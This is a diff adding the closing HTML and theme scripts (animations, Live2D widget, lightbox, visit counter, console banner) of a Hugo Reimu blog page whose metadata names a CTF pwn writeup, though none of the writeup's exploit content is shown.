+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script><script>
+  function initLive2d() {
+    live2d.init('https:\/\/fastly.jsdelivr.net\/gh\/D-Sketon\/plugin-live2d\/', {themeTipsPath: ""});
+  }
+</script><script
+    src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js"
+    asynconload="initLive2d()"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "0xFl",
+          title: "Idek CTF - MySpace2 PWN Writeup",
+          url: "https:\/\/0xFlp.github.io\/post\/myspace2\/",
+          description: " MySpace2 - Idek CTF Challenge Description I miss MySpace. Ranking my friends publicly is goated. I decided to bring it back, with new security features so we can all win! This binary is a 64-bit ELF executable with the following protections:\n➜ checksec myspace2 Arch: amd64-64-little RELRO: Partial …",
+          cover: "https:\/\/0xFlp.github.io\/images\/cover_images\/space.jpg",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
